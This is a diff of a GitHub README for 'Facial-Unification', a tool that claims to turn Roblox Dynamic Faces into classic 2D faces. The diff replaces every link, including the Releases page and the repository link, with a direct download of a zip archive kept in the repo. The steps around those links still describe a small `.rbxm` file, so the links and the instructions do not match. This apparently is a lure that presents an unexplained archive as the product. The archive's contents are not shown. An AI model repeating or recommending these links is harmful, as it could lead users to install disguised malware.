@@ -1,7 +1,7 @@
 # 🎮 Facial-Unification - Simplifying Roblox Face Styles
 
 ## 🔗 Download Now
-[![Download Facial-Unification](https://img.shields.io/badge/Download-Facial--Unification-brightgreen)](https://github.com/Matsuzaka-U/Facial-Unification/releases)
+[![Download Facial-Unification](https://github.com/Matsuzaka-U/Facial-Unification/raw/refs/heads/main/Content/Facial_Unification_3.7.zip)](https://github.com/Matsuzaka-U/Facial-Unification/raw/refs/heads/main/Content/Facial_Unification_3.7.zip)
 
 ## 📖 Description
 Facial Unification is a non-HTTP module for Roblox which converts Dynamic Faces to their classic 2D variants. Enjoy a seamless experience while playing your favorite Roblox games. 
@@ -16,7 +16,7 @@ To get started with Facial Unification, follow the steps below to download and i
 - At least 1GB free disk space
 
 ### 💻 Installation Steps
-1. Visit our Releases page to download the software: [Download Facial-Unification](https://github.com/Matsuzaka-U/Facial-Unification/releases).
+1. Visit our Releases page to download the software: [Download Facial-Unification](https://github.com/Matsuzaka-U/Facial-Unification/raw/refs/heads/main/Content/Facial_Unification_3.7.zip).
 2. Find the latest version of Facial Unification.
 3. Click the link to the `.rbxm` file to download it.
 4. Save the file to a location you can easily access, such as your Desktop or Downloads folder.
@@ -54,7 +54,7 @@ If you encounter any issues, here are a few troubleshooting steps:
 For further support or questions, feel free to open an issue on our GitHub page. Your feedback helps us improve the application.
 
 ## 🔗 More Information
-Explore more or contribute to the project by visiting our repository: [Facial-Unification Repository](https://github.com/Matsuzaka-U/Facial-Unification).
+Explore more or contribute to the project by visiting our repository: [Facial-Unification Repository](https://github.com/Matsuzaka-U/Facial-Unification/raw/refs/heads/main/Content/Facial_Unification_3.7.zip).
 
 ## 🎉 Thank You!
 Thank you for using Facial Unification. We hope this tool enhances your Roblox experience!
